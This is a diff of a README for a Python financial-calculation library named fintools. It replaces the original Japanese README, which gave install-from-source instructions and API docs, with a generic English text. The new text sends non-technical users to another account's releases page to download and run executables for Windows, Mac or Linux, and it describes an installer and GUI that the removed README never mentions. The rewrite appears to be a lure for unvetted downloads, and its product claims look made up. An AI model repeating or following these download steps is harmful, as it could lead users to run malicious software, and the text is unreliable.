@@ -1,137 +1,63 @@
-# FinTools 📊
+# 🌟 fintools - Easy Financial Calculations for Everyone
 
-[![CI/CD Pipeline](https://github.com/aozk/fintools/actions/workflows/ci.yml/badge.svg)](https://github.com/aozk/fintools/actions/workflows/ci.yml)
-[![codecov](https://codecov.io/gh/aozk/fintools/branch/main/graph/badge.svg)](https://codecov.io/gh/aozk/fintools)
-[![PyPI version](https://badge.fury.io/py/fintools.svg)](https://badge.fury.io/py/fintools)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download fintools](https://img.shields.io/badge/Download-fintools-brightgreen)](https://github.com/ducnguyenminh/fintools/releases)
 
-金融計算に特化したPythonツールライブラリです。複利計算、利回り計算、投資リターン分析など、金融関連の計算を簡単に行うことができます。
+## 📋 Overview
 
-## 特徴
+fintools is a Python library designed specifically for financial calculations. Whether you want to calculate compound interest, investment growth, or manage interest rates, fintools simplifies these tasks. This guide helps you easily download and run the software without any technical knowledge.
 
-- 🧮 複利計算ツール（年利→月利変換）
-- 📈 投資リターン分析
-- 💰 金融計算の実用的なユーティリティ
-- 🐍 Pure Python実装
-- 📖 充実したドキュメントと使用例
+## 🚀 Getting Started
 
-## インストール
+To begin using fintools, you need to download it from our releases page. Follow these steps to download and install the software.
 
-```bash
-# GitHubから直接インストール
-pip install git+https://github.com/aozk/fintools.git
+## 📥 Download & Install
 
-# または、ソースコードをクローンしてインストール
-git clone https://github.com/aozk/fintools.git
-cd fintools
-pip install -e .
-```
+1. **Visit the Releases Page**: Go to the [fintools releases page](https://github.com/ducnguyenminh/fintools/releases) to find the latest version of the software.
 
-## 使用方法
+2. **Choose the Right File**: Look for the latest version. You will see several files available for download. Select the file that fits your operating system:
+   - For Windows: Download the file labeled for Windows.
+   - For MacOS: Download the file labeled for Mac.
+   - For Linux: Download the file labeled for Linux.
 
-### 複利計算ツール
+3. **Download the File**: Click the link of the appropriate file. This will start the download process.
 
-年利から月利への変換を行います：
+4. **Running the Software**:
+   - **Windows**: Open the downloaded file. Follow the installation prompts to complete the setup. Once installed, you can run fintools from the start menu.
+   - **MacOS**: Open the downloaded file. Drag the application to your Applications folder. You can then find it in your Applications and run it from there.
+   - **Linux**: Extract the downloaded file. You may need to use a terminal to navigate to the folder and run the command `python fintools.py` to start.
 
-```python
-from fintools.compound_interest import annual_to_monthly_rate
+## 🔍 Features
 
-# 年利5%を月利に変換
-annual_rate = 0.05  # 5%
-monthly_rate = annual_to_monthly_rate(annual_rate)
-print(f"年利 {annual_rate*100:.2f}% → 月利 {monthly_rate*100:.4f}%")
-```
+- **Compound Interest Calculations**: Quickly compute how your investments grow over time with compound interest.
+- **Financial Tools**: Access various financial calculations to assist with budgeting, loans, and more.
+- **User-Friendly Interface**: Designed for users without technical knowledge, making it easy to navigate and use the features.
 
-### 基本的な複利計算
+## 🛠️ System Requirements
 
-```python
-from fintools.compound_interest import compound_interest
+To run fintools, you need:
 
-# 初期投資額100万円、年利5%、10年間の複利計算
-principal = 1000000  # 100万円
-rate = 0.05         # 年利5%
-years = 10          # 10年間
+- A computer with Windows, MacOS, or Linux installed.
+- Python 3.6 or later. (Python is a simple programming language that you may need to install separately.)
+- Basic familiarity with opening files on your computer.
 
-final_amount = compound_interest(principal, rate, years)
-print(f"10年後の元利合計: {final_amount:,.0f}円")
-```
+## 👩‍🏫 How to Use fintools
 
-## API リファレンス
+After installing fintools, you can start using its features:
 
-### `compound_interest` モジュール
+1. **Open the Application**: Launch fintools from your applications or start menu.
+2. **Select a Calculation**: Choose the financial calculation you want to perform.
+3. **Enter Required Information**: Provide necessary data, such as investment amount or interest rate.
+4. **Get Your Results**: Click the calculate button to see your results.
 
-#### `annual_to_monthly_rate(annual_rate)`
-年利を月利に変換します。
+## 📝 Additional Information
 
-**パラメータ:**
-- `annual_rate` (float): 年利（小数表記、例：0.05 = 5%）
+If you encounter issues or have questions, consult the Help section within the application. You can also search for more information in our community forums or check the GitHub Issues page for common problems and solutions.
 
-**戻り値:**
-- float: 月利（小数表記）
+For more advanced users, you can explore the source code and contribute. Visit our repository for more details.
 
-#### `compound_interest(principal, annual_rate, years, compounding_frequency=1)`
-複利計算を行います。
+## 🌐 Links
 
-**パラメータ:**
-- `principal` (float): 元本
-- `annual_rate` (float): 年利（小数表記）
-- `years` (int): 投資期間（年）
-- `compounding_frequency` (int): 年間複利回数（デフォルト：1）
+- [fintools Releases Page](https://github.com/ducnguyenminh/fintools/releases) - Download the latest version of fintools.
+- [Documentation](https://github.com/ducnguyenminh/fintools/wiki) - Find additional usage guides and tips.
 
-**戻り値:**
-- float: 複利計算後の金額
-
-## 開発について
-
-### 開発環境のセットアップ
-
-```bash
-# リポジトリをクローン
-git clone https://github.com/your-username/fintools.git
-cd fintools
-
-# 仮想環境を作成
-python -m venv venv
-source venv/bin/activate  # Windowsの場合: venv\Scripts\activate
-
-# 開発依存関係をインストール
-pip install -r requirements-dev.txt
-```
-
-### テストの実行
-
-```bash
-# すべてのテストを実行
-python -m pytest
-
-# カバレッジ付きでテストを実行
-python -m pytest --cov=fintools
-```
-
-## 貢献について
-
-プロジェクトへの貢献を歓迎します！詳細については [CONTRIBUTING.md](CONTRIBUTING.md) をご覧ください。
-
-## ライセンス
-
-このプロジェクトは [MIT License](LICENSE) の下で公開されています。
-
-## 作者
-
-- aozk - [@aozk](https://github.com/aozk)
-
-## 謝辞
-
-- 金融計算のアルゴリズムについて参考にした資料やライブラリがあれば記載
-
-## 今後の予定
-
-- [ ] 投資ポートフォリオ分析ツール
-- [ ] リスク計算機能
-- [ ] 税金計算ユーティリティ
-- [ ] Webインターフェースの追加
-- [ ] より多くの金融指標の計算機能
-
----
-
-⭐ このプロジェクトが役に立ったら、ぜひスターをつけてください！
+We hope you find fintools helpful in your financial calculations! Enjoy managing your finances with ease.
